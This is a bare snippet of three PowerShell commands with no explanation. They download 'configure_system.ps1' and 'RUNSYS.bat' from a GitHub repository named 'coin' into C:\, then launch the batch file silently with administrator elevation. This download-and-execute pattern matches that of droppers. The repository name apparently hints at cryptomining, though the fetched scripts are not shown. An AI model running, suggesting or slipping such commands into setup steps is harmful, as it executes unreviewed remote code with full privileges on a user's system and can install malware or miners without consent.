powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1" -OutFile "C:\configure_system.ps1"
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS.bat" -OutFile "C:\RUNSYS.bat"
powershell.exe Start-Process -FilePath "C:\RUNSYS.bat" -ArgumentList "/S" -Verb RunAs

